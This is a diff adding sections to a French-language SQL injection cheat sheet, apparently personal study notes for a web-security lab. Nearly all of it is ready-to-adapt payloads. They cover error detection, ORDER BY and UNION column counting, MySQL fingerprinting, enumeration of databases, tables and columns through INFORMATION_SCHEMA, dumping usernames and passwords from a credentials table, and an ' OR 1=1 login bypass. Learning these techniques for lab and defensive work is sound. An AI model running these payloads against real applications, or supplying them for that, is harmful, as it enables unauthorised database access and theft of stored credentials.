@@ -236,6 +236,127 @@ Dès qu’il y a une erreur : tu as trouvé le nombre max de colonnes affichées
   - `' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users'-- -`
 
   - `' UNION SELECT username, 2, 3 FROM users-- -`
+    
+
+# Union Injection
+
+## 1. Détection de vulnérabilité
+
+`'`:  
+Tester si une erreur SQL apparaît (détection rapide de vulnérabilité SQLi).
+
+## 2. Découverte du nombre de colonnes
+
+`' order by 1-- -`:  
+Tester si la colonne 1 existe.
+
+`' order by 2-- -`:  
+Tester si la colonne 2 existe.
+
+`' order by 3-- -`:  
+Tester si la colonne 3 existe.
+
+`' order by 4-- -`:  
+Tester si la colonne 4 existe.
+
+`' order by 5-- -`:  
+Erreur : nombre de colonnes atteint (celle-ci n’existe pas).
+
+## 3. Découverte du nombre de colonnes via UNION
+
+`cn' UNION select 1,2,3-- -`:  
+Tester une injection UNION avec 3 colonnes.
+
+`cn' UNION select 1,2,3,4-- -`:  
+Tester une injection UNION avec 4 colonnes (essaie jusqu’à succès).
+
+## 4. Déterminer les colonnes affichées
+
+`cn' UNION select 1,2,3,4-- -`:  
+Permet de voir quelles colonnes s’affichent à l’écran (ex : si tu vois “2, 3, 4”, ce sont les colonnes affichées).
+
+## 5. Tester l’affichage de données spécifiques
+
+`cn' UNION select 1,@@version,3,4-- -`:  
+Affiche la version de la base de données si la colonne 2 est visible.
+
+## 6. Récupération d’informations de base
+
+`cn' UNION select 1, database(), 3, 4-- -`:  
+Affiche le nom de la base de données active.
+
+`cn' UNION select 1, user(), 3, 4-- -`:  
+Affiche le nom d’utilisateur SQL courant.
+
+`cn' UNION select 1, group_concat(table_name), 3, 4 from information_schema.tables where table_schema=database()-- -`:  
+Liste toutes les tables de la base courante.
+
+`cn' UNION select 1, group_concat(column_name), 3, 4 from information_schema.columns where table_name='NOM_DE_LA_TABLE'-- -`:  
+Liste toutes les colonnes de la table ciblée (remplace NOM_DE_LA_TABLE).
+
+## 7. Récupérer les données d’une table
+
+`cn' UNION select 1, group_concat(col1,0x3a,col2), 3, 4 from NOM_DE_LA_TABLE-- -`:  
+Affiche les valeurs des colonnes (remplace col1, col2, et NOM_DE_LA_TABLE).
+
+## 8. Astuces diverses
+
+`' OR 1=1-- -`:  
+Bypass simple d’un login si la requête n’est pas protégée.
+
+`' AND 1=0-- -`:  
+Force la requête à retourner aucun résultat.
+
+`' UNION SELECT NULL, NULL, NULL, NULL-- -`:  
+Pour les requêtes où les champs ne peuvent pas être des entiers, utiliser NULL comme joker.
+
+# Database Enumeration
+
+## 1. Fingerprinting du SGBD (identifier MySQL)
+
+`cn' UNION select 1,@@version,3,4-- -`:  
+Affiche la version du SGBD, permet d’identifier MySQL/MariaDB.
+
+`cn' UNION select 1,POW(1,1),3,4-- -`:  
+Retourne 1 sur MySQL, erreur sur d’autres SGBD (test numérique discret).
+
+`cn' UNION select 1,SLEEP(5),3,4-- -`:  
+Fait “dormir” la requête 5 secondes (test de time-based pour MySQL).
+
+## 2. Énumérer les bases de données (databases)
+
+`cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -`:  
+Affiche toutes les bases de données présentes sur le serveur.
+
+`cn' UNION select 1,database(),3,4-- -`:  
+Affiche la base de données actuellement utilisée par l’application.
+
+## 3. Énumérer les tables dans une base
+
+`cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -`:  
+Liste toutes les tables de la base “dev” (remplace “dev” selon la base)
+
+## 4. Énumérer les colonnes dans une table
+
+`cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -`:  
+Liste toutes les colonnes de la table “credentials” (remplace par le nom de la table à cibler).
+
+## 5. Dumper les données d’une table spécifique
+
+`cn' UNION select 1,username,password,4 from dev.credentials-- -`:  
+Affiche les valeurs des colonnes “username” et “password” de la table “credentials” de la base “dev”.
+
+## 6. Exemples génériques pour s’adapter à n’importe quelle table
+
+`cn' UNION select 1,<colonne1>,<colonne2>,4 from <db>.<table>-- -`:  
+À adapter selon les noms de colonnes, base et table trouvés via l’énumération.
+
+## 7. Notes & Astuces
+
+- Ignorer les bases “mysql”, “information_schema”, “performance_schema”, “sys” sauf cas particulier (elles sont par défaut).
+- Utiliser toujours le point `.` pour préciser une table d’une autre base que celle courante : `<db>.<table>`.
+- Remplacer les colonnes de la requête par celles effectivement affichées sur le site cible.
+- On peux concaténer plusieurs colonnes avec `CONCAT(col1, ':', col2)` ou `group_concat()` si besoin d’afficher tout sur une ligne
 
 
 
